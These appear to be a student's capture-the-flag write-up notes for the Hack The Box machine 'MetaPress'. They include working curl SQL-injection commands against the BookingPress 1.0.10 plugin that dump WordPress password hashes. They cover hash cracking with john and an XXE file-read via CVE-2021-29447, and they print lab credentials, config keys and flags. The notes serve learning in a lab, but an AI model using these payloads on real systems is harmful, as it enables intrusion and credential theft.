there is definitely an _admin_ user, from the sitemap of users, and it being the only author on the page.
Thinking this can be used to log into the wp-login page?

wordpress version = 5.6.2
twenty twenty-one version = 1.1 (theme)
booking press version = 1.0.10

gobuster further scans:
wp-includes
wp-content
wp-admin


robots.txt:
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://metapress.htb/wp-sitemap.xml

the payload 
```
metapress.htb/wp-admin/admin-ajax.php\?action=umm_switch_action\&umm_sub_action=[umm_delete_user_meta|umm_edit_user_meta]&umm_user=SLEEP(5)
```
made the page load for 5 seconds, so should be onto something for this.


However, looking further into the source code of the events booking page, I found the _bookingpress plugin, version 1.0.10. This is apparently vulnerable to an [unauthenticated sqli](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)



line 697 of the events booking page, had the wpnonce:
```
								var postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'1a3cde3753' };
```
so I assumed that from this, with it it was possible to perhaps do the exploit without the first steps requiring being logged in. 

```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=1a3cde3753&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,table_schema,table_name,6 from information_schema.tables-- -' 
```

Interesting tables:
FILES
GLOBAL_STATUS
KEYWORDS
GLOBAL_VARIABLES
COLUMNS
PARAMETERS
PARTITIONS
PLUGINS
PROCESSLIST
PROFILING
REFERENTIAL_CONSTRAINTS
SCHEMATA
SCHEMA_PRIVILEGES
SESSION_STATUS
SESSION_VARIABLES
STATISTICS
SQL_FUNCTIONS
SYSTEM_VARIABLES
TABLES
TABLESPACES
TABLE_CONSTRAINTS
USER_PRIVILEGES
INNODB_SYS_DATAFILES
user_variables
INNODB_FT_DELETED
__blog__ 
	wp_options
	wp_term_taxonomy
	wp_bookingpress_servicesmeta
	wp_ommentmeta
	wp_users !!!!
	wp_bookingpress_customers_meta
	wp_bookingpress_settings
	wp_bookingpress_appointment_bookings
	wp_bookingpress_debug_payment_log
	wp_bookingpress_services
	wp_termmeta
	wp_links
	wp_bookingpress_entries
	wp_bookingpress_customers
	wp_usermeta
	

user_login
user_pass !!
user_nicename
user_email

user_activation_key
bookingpress_customersmeta_key
bookingpress_staff_member_id
bookingpress_wpuser_id
bookingpress_user_login
bookingpress_user_type
user_id
	
the command 
```
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=1a3cde3753&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,user_nicename,1,user_email,3,4,5,6 from blog.wp_users-- -'
```
gave 2 users: _admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV._ and _manager:$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70_
Those both look like 'uncrackable hashes'. SO maybe changing the user_pass is possible?	
	

with `john -w=/usr/share/wordlists/rockyou.txt hashes.txt` I got the result _partylikearockstar_.

Trying to log into wordpress with it, it did not match the admin account, but worked for manager!
So using the credentials _manager:partylikearockstar_ I got access to the wp page.

![[Screenshot 2022-12-05 at 15.45.50.png]]
There is a _leira-roles_ plugin version 1.1.8.0?
	
	
WP version 5.6.2 exploits:
https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
I found one [CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)
following ^ report with the files evil.dtd and payload.wav + setting up a python http server I got the contents of /etc/passwd and wp-config.php.

*(https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)*

```
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );
```
+ ftp user:pass: _metapress.htb:9NYS_ii@FyL_p5M2NvJ_. And we got access!

	
in the _send_email.php_ file I found the credentials _jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys_

Luckily, he reuses his password so we got ssh access!!! and the flag _82a62ac9c5ecd52bbecb68a7099e27f8_


in the pass file there were the creentials _root@metapress.htb:p7qfAZt4_A1xo_0x_

--> of course this would have been too easy, so ssh connection did not work.


Reading the root.pass file, there is a PGP key:
```
-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----
```


The /home/jnelson/.passpie/.keys contained both the public and private keys of _jnelson_, so I assume these could now be used to decrypt the pgp message?

For this next bit, I figured out that the private key had to be decrypted. This could be done using john and gave the passkey: _blink182_

Using this, I could now export the passwords from the passpie with the commands:
`touch pass`
`passpie export pass`

HOWEVER, the password in this file was the one I already had (possibly already left on the system by a previous user), but I HAD JUST ATTEMPTED TO CONNEC TO THE ROOT USER IN THE WRONG WAY. It was not possible to SSH in from 'remote', I had to just `su root`...

Root flag: bf1c98dce284382958accdc896e9e457


